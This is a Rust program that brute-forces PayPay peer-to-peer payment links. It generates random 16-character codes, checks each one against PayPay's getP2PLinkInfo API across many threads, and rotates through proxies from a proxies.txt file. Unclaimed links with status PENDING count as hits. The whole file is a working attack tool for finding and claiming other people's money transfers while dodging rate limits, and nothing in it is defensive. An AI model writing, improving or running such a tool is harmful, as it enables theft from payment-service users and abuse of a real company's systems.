mod log;

use std::fs;
use std::sync::Arc;

use rand::distributions::Alphanumeric;
use rand::SeedableRng;
use rand::{rngs::StdRng, Rng};
use serde::{Deserialize, Serialize};
use uuid::Uuid;
use colored::Colorize;

#[derive(Serialize, Deserialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
struct PayPayHeader {
    result_code: String,
    result_message: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
struct PayPayErrorBody {
    backend_result_code: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
struct PayPayPayloadBody {
    order_status: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
struct PayPayResponse {
    header: PayPayHeader,
    error: Option<PayPayErrorBody>,
    payload: Option<PayPayPayloadBody>,
}

#[tokio::main]
async fn main() {
    log::info("Welcome");

    let proxies_raw_txt =
        fs::read_to_string("proxies.txt").expect("Unable to read proxies.txt file");
    let proxies_raw_txt = Arc::new(proxies_raw_txt);
    let no_proxy = proxies_raw_txt.is_empty();
    let proxies: Vec<_> = proxies_raw_txt.lines().filter(|x| !x.is_empty()).collect();
    let proxies: Vec<String> = proxies.iter().map(|x| x.to_string()).collect();
    let proxies_len = proxies.len();
    let proxies = Arc::new(proxies);
    if proxies_raw_txt.is_empty() {
        log::warn("No proxies found in proxies.txt");
    } else {
        log::success(format!("Loaded {} proxies", proxies.len()));
    }
    log::question("How many threads do you want to use?");
    let mut threads = String::new();
    std::io::stdin()
        .read_line(&mut threads)
        .expect("Failed to read line");
    let threads: usize = threads.trim().parse().expect("Please type a number!");

    for i in 0..threads {
        let proxies = Arc::clone(&proxies);
        tokio::spawn(async move {
            log::info(format!("Thread {} started", i));
            loop {
                let mut rng = StdRng::from_entropy();
                let chars: String = (0..16).map(|_| rng.sample(Alphanumeric) as char).collect();
                let proxy = if no_proxy {
                    None
                } else {
                    Some(proxies[rng.gen_range(0..proxies_len)].clone())
                };
                let url = format!("https://pay.paypay.ne.jp/{}", chars);
                log::info(format!("[{}] {}", i, url));
                let check_url = format!("https://www.paypay.ne.jp/app/v2/p2p-api/getP2PLinkInfo?verificationCode={}&client_uuid={}", chars, Uuid::new_v4());
                let client = if no_proxy {
                    reqwest::Client::builder().build().unwrap()
                } else {
                    reqwest::Client::builder()
                        .proxy(reqwest::Proxy::all(proxy.clone().unwrap()).unwrap())
                        .build()
                        .unwrap()
                };
                let res = client
                    .get(&check_url)
                    .send()
                    .await;
                if let Err(_) = res {
                    log::error(format!("[{}] {} {}", i, "CONNECT_ERROR".red(), url));
                    continue;
                }
                let res = res
                    .unwrap()
                    .json::<PayPayResponse>()
                    .await;
                match res {
                    Ok(data) => {
                        if data.error.is_some() {
                            log::error(format!("[{}] {}", i, url));
                            continue;
                        }
                        if data.payload.unwrap().order_status == "PENDING" {
                            log::success(format!("[{}] {}", i, url));
                        } else {
                            log::error(format!("[{}] Already used: {}", i, url));
                        }
                    }
                    Err(_) => {
                        log::error(format!("[{}] {} {}", i, "FATAL".red(), url));
                    }
                }
            }
        });
    }

    loop {
        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
    }
}

/*let mut rng = thread_rng();
loop {
    let chars: String = (0..16).map(|_| rng.sample(Alphanumeric) as char).collect();
    println!("https://pay.paypay.ne.jp/{}", chars);
}*/
